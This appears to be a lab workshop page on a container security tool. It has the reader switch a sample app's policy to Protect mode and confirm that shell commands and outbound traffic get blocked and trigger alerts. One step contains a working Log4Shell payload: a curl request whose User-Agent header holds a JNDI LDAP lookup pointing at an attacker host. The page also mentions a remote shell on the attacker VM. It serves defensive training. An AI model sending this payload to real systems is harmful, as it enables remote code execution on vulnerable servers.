+++
title = "Protect sample-app"
weight = 21
+++

Go to **Policy > Groups** and choose the `nv.sample-app.default` group.

Switch the mode of this group to **Protect**.

Go to process profile rules and delete all rules but the ones for `pause` and `java`.

Execute any command in the remote shell on the attacker01 vm and see that its blocked.

You will have an alert under **Notifications > Security Events**.

Go to **Policy > Network Rules** and delete the rule

* From `nv.sample-app.default` to `external`

Execute the request to trigger the attack:

Run the following commands on the victim01 VM.

```ctr
curl http://sample-app.default.${vminfo:victim01:public_ip}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${vminfo:attacker01:public_ip}:1389/a}'
```

You will have an alert under **Notifications > Security Events**.
